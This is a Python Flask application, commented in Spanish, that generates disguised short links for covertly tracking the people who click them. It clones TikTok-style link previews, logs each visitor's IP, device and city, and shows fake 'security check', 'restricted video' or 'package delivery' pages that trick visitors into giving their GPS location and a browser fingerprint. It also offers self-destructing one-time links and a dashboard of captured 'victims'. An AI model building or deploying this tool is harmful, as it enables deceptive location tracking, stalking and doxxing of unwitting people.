import os
import random
import string
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify, redirect, render_template, session
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

# ==========================================
# 1. CONFIGURACIÓN DE SEGURIDAD Y VARIABLES
# ==========================================

# Llave secreta fija para evitar errores de sesión al reiniciar (CRÍTICO PARA LOGIN)
app.secret_key = "llave_maestra_indestructible_2025"

# Tu PIN de Administrador (Leído de Railway o por defecto 1234)
ADMIN_PIN = os.environ.get("ADMIN_PIN", "1234") 

# URL de la Base de Datos (Proviesta por Railway)
DATABASE_URL = os.environ.get("DATABASE_URL")

# Cabeceras para engañar a los sistemas anti-robot de TikTok
HEADERS_FALSOS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'es-ES,es;q=0.9',
}

# ==========================================
# 2. CONEXIÓN Y GESTIÓN DE BASE DE DATOS
# ==========================================

def get_db_connection():
    """Establece conexión con PostgreSQL"""
    if not DATABASE_URL:
        return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        return conn
    except Exception as e:
        print(f"Error conectando a la DB: {e}")
        return None

def inicializar_db():
    """Crea las tablas iniciales si no existen al arrancar"""
    try:
        conn = get_db_connection()
        if conn is None:
            return
        cur = conn.cursor()
        
        # Tabla de Trampas (Los links que generas)
        # Incluye todas las columnas nuevas: template, one_time, etc.
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trampas (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE NOT NULL,
                nombre VARCHAR(100),
                url_destino TEXT,
                meta_titulo TEXT,
                meta_desc TEXT,
                meta_img TEXT,
                usar_gps BOOLEAN DEFAULT FALSE,
                one_time BOOLEAN DEFAULT FALSE,
                template_type TEXT DEFAULT 'security',
                created_at TIMESTAMP DEFAULT NOW()
            );
        """)
        
        # Tabla de Intrusos (Las víctimas que caen)
        # Incluye fingerprint para Rayos X
        cur.execute("""
            CREATE TABLE IF NOT EXISTS intrusos (
                id SERIAL PRIMARY KEY,
                trampa_id INTEGER REFERENCES trampas(id),
                ip_address VARCHAR(45),
                user_agent TEXT,
                city VARCHAR(100),
                lat TEXT,
                lon TEXT,
                accuracy TEXT,
                fingerprint TEXT,
                captured_at TIMESTAMP DEFAULT NOW()
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"Error en inicialización de DB: {e}")

@app.route('/update_db_schema')
def update_db_schema():
    """Ruta de Mantenimiento: Agrega columnas nuevas si actualizamos el código"""
    # Protección: Solo si está logueado
    if not session.get('logged_in'):
        return redirect('/login')
        
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Actualizaciones V3 (GPS)
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS usar_gps BOOLEAN DEFAULT FALSE;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lat TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lon TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS accuracy TEXT;")
        
        # Actualizaciones V4 (Disfraz Personalizado)
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS url_destino TEXT;")
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS meta_titulo TEXT;")
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS meta_desc TEXT;")
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS meta_img TEXT;")
        
        # Actualizaciones V7 (Autodestrucción y Rayos X)
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS one_time BOOLEAN DEFAULT FALSE;")
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS template_type TEXT DEFAULT 'security';")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS fingerprint TEXT;")
        
        conn.commit()
        cur.close()
        conn.close()
        return "<h1>✅ Base de Datos Actualizada: Todas las funciones listas.</h1>"
    except Exception as e:
        return f"❌ Error actualizando DB: {e}"

# ==========================================
# 3. HERRAMIENTAS DE INTELIGENCIA
# ==========================================

def generar_token():
    """Crea un código único aleatorio de 6 caracteres"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def obtener_ubicacion(ip):
    """Consulta la API de geolocalización para obtener Ciudad/País"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        data = response.json()
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']}"
        else:
            return "Desconocida"
    except:
        return "Error Geo"

def acortar_link(url_larga):
    """Convierte el link de Railway en un link de is.gd"""
    try:
        api_url = f"https://is.gd/create.php?format=simple&url={url_larga}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            return response.text.strip()
        return url_larga
    except:
        return url_larga

def clonar_metadatos(url_destino):
    """Visita la web objetivo y roba el Título, Descripción e Imagen"""
    print(f"🕵️‍♂️ Iniciando clonado de: {url_destino}")
    try:
        response = requests.get(url_destino, headers=HEADERS_FALSOS, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        t = soup.find("meta", property="og:title")
        d = soup.find("meta", property="og:description")
        i = soup.find("meta", property="og:image")
        
        # Valores por defecto si falla el scraping
        t_final = t["content"] if t else "Video Viral"
        d_final = d["content"] if d else "Haz clic para ver el video completo."
        i_final = i["content"] if i else "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png"
        
        return t_final, d_final, i_final
    except Exception as e:
        print(f"Error en scraping: {e}")
        return "Video", "Ver video", ""

# ==========================================
# 4. SISTEMA DE LOGIN (SEGURIDAD)
# ==========================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        try:
            data = request.json
            pin_ingresado = data.get('pin')
            
            # Verificación estricta del PIN
            if str(pin_ingresado) == str(ADMIN_PIN):
                session['logged_in'] = True
                session.permanent = False # La sesión muere al cerrar el navegador
                return jsonify({"status": "ok"})
            else:
                return jsonify({"status": "error", "mensaje": "PIN Incorrecto"}), 401
        except Exception as e:
            return jsonify({"status": "error", "mensaje": str(e)}), 500
            
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

# ==========================================
# 5. RUTAS PRIVADAS (DASHBOARD)
# ==========================================

@app.route('/')
def home():
    if not session.get('logged_in'):
        return redirect('/login')
    return render_template('index.html')

@app.route('/api/borrar_logs', methods=['POST'])
def borrar_logs():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("DELETE FROM intrusos;")
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "mensaje": str(e)}), 500

@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    
    try:
        d = request.json
        # Recuperamos los datos del formulario
        nombre = d.get('nombre', 'Trampa')
        url_destino = d.get('url_destino', '')
        usar_gps = d.get('usar_gps', False)
        one_time = d.get('one_time', False) 
        template = d.get('template_type', 'security')
        
        meta_titulo = d.get('meta_titulo', '')
        meta_desc = d.get('meta_desc', '')
        meta_img = d.get('meta_img', '')
        
        # Si el usuario no puso metadatos manuales, intentamos clonarlos
        if not meta_titulo:
            meta_titulo, meta_desc, meta_img = clonar_metadatos(url_destino)
        
        token = generar_token()
        
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO trampas 
            (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps, one_time, template_type) 
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
        """, (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps, one_time, template))
        
        conn.commit()
        cur.close()
        conn.close()
        
        # Generar link corto
        link_final = acortar_link(f"{request.host_url}s/{token}")
        return jsonify({"status": "ok", "link": link_final})
        
    except Exception as e:
        print(f"Error creando trampa: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Seleccionamos todos los datos, incluyendo el 'fingerprint'
        cur.execute("""
            SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city, i.lat, i.lon, i.fingerprint
            FROM intrusos i 
            JOIN trampas t ON i.trampa_id = t.id
            ORDER BY i.captured_at DESC 
            LIMIT 50
        """)
        ataques = cur.fetchall()
        cur.close()
        conn.close()
        
        resultado = []
        for a in ataques:
            # Ajuste de hora para Ecuador (GMT-5)
            hora_ecu = a[2] - timedelta(hours=5)
            
            resultado.append({
                "trampa": a[0],
                "ip": a[1],
                "hora": hora_ecu.strftime("%H:%M - %d/%m"),
                "dispositivo": a[3],
                "ubicacion": a[4] if a[4] else "Desconocida",
                "lat": a[5],
                "lon": a[6],
                "fingerprint": a[7] if a[7] else "" # Datos técnicos
            })
        return jsonify(resultado)
    except Exception as e:
        print(f"Error leyendo logs: {e}")
        return jsonify([])

# ==========================================
# 6. RUTAS PÚBLICAS (LA TRAMPA)
# ==========================================

@app.route('/s/<token>')
def trampa(token):
    ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_victima and ',' in ip_victima:
        ip_victima = ip_victima.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    
    conn = get_db_connection()
    cur = conn.cursor()
    
    # Buscamos la trampa y sus configuraciones
    cur.execute("""
        SELECT id, url_destino, meta_titulo, meta_desc, meta_img, usar_gps, one_time, template_type 
        FROM trampas WHERE token = %s
    """, (token,))
    res = cur.fetchone()
    
    if not res:
        return redirect("https://google.com")
    
    trampa_id, url_final, m_t, m_d, m_i, usar_gps, one_time, template = res
    
    # Detección de Bots (WhatsApp, Telegram, Facebook)
    ua_str = str(user_agent).lower()
    es_bot = any(x in ua_str for x in ['facebook', 'whatsapp', 'telegram', 'twitter', 'instagram'])
    
    # LÓGICA DE AUTODESTRUCCIÓN
    if one_time:
        # Contamos si ya hubo visitas reales (no bots)
        if not es_bot:
            cur.execute("SELECT count(*) FROM intrusos WHERE trampa_id = %s", (trampa_id,))
            visitas = cur.fetchone()[0]
            if visitas > 0:
                # Si ya se usó, el link muere aquí.
                cur.close()
                conn.close()
                return "<h1>404 Link Expired</h1>", 404
    
    # Lógica de Geolocalización Básica
    ubicacion = obtener_ubicacion(ip_victima)
    
    if not es_bot:
        # Guardamos el registro inicial (IP, Ciudad, User Agent)
        cur.execute("""
            INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) 
            VALUES (%s, %s, %s, %s)
        """, (trampa_id, ip_victima, user_agent, ubicacion))
        conn.commit()
    
    cur.close()
    conn.close()

    # Si es un bot, mostramos los metadatos falsos para la preview
    if es_bot:
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:type" content="website">
            <meta property="og:site_name" content="TikTok">
            <meta property="og:title" content="{m_t}">
            <meta property="og:description" content="{m_d}">
            <meta property="og:image" content="{m_i}">
            <meta name="twitter:card" content="summary_large_image">
        </head>
        <body></body>
        </html>
        """

    # Si es humano y requiere GPS, mostramos el Tracker con la plantilla elegida
    if usar_gps:
        page_data = {
            "title": "Security Check",
            "icon": "🛡️",
            "text": "Verificando conexión segura. Confirma tu ubicación para continuar.",
            "btn": "Confirmar Acceso"
        }
        
        if template == "video":
            page_data = {
                "title": "⚠️ Video Restringido",
                "icon": "📺",
                "text": "Este contenido tiene bloqueo regional. Verifica tu ubicación para desbloquear la reproducción.",
                "btn": "VERIFICAR Y REPRODUCIR"
            }
        elif template == "delivery":
            page_data = {
                "title": "Envío Pendiente",
                "icon": "📦",
                "text": "El conductor necesita tu ubicación exacta para entregar el paquete.",
                "btn": "COMPARTIR UBICACIÓN"
            }
            
        return render_template('tracker.html', data=page_data)
    
    # Si no hay GPS, redirigir directo
    return redirect(url_final)

# --- RUTA PARA GUARDAR DATOS AVANZADOS (GPS + FINGERPRINT) ---
@app.route('/api/save_gps', methods=['POST'])
def save_gps():
    try:
        data = request.json
        token = data.get('token')
        
        conn = get_db_connection()
        cur = conn.cursor()
        
        # Buscamos el ID de la trampa
        cur.execute("SELECT id FROM trampas WHERE token = %s", (token,))
        res = cur.fetchone()
        
        if res:
            trampa_id = res[0]
            # Actualizamos el ÚLTIMO registro insertado para esta trampa
            cur.execute("""
                UPDATE intrusos 
                SET lat=%s, lon=%s, accuracy=%s, fingerprint=%s
                WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)
            """, (
                str(data.get('lat')), 
                str(data.get('lon')), 
                str(data.get('acc')), 
                str(data.get('fingerprint')), 
                trampa_id, trampa_id
            ))
            conn.commit()
        
        cur.close()
        conn.close()
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Error guardando datos avanzados: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/api/save_gps_bounce', methods=['GET'])
def save_gps_bounce():
    t = request.args.get('token')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    acc = request.args.get('acc')
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino FROM trampas WHERE token=%s", (t,))
    res = cur.fetchone()
    url_final = "https://tiktok.com"
    
    if res:
        tid, url_final = res
        cur.execute("UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)", (lat, lon, acc, tid, tid))
        conn.commit()
    cur.close()
    conn.close()
    return redirect(url_final)

@app.route('/redirect/<token>')
def redirect_final(token):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT url_destino FROM trampas WHERE token = %s", (token,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return redirect(res[0] if res else "https://tiktok.com")

# --- RUTA DE EMERGENCIA: RESET COMPLETO (LA QUE NECESITAS) ---
@app.route('/emergency_reset')
def emergency_reset():
    if not session.get('logged_in'): return redirect('/login')
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Borramos las tablas completas para matar datos corruptos
        cur.execute("DROP TABLE IF EXISTS intrusos CASCADE;")
        cur.execute("DROP TABLE IF EXISTS trampas CASCADE;")
        conn.commit()
        cur.close()
        conn.close()
        # Las creamos de nuevo limpias
        inicializar_db()
        return "<h1>✅ SISTEMA FORMATEADO: Datos corruptos eliminados.</h1><p>Ahora puedes entrar a la App.</p>"
    except Exception as e: return f"Error: {e}"

# Arrancar la inicialización de DB al iniciar el script
inicializar_db()

if __name__ == '__main__':
    app.run(debug=True, port=5000)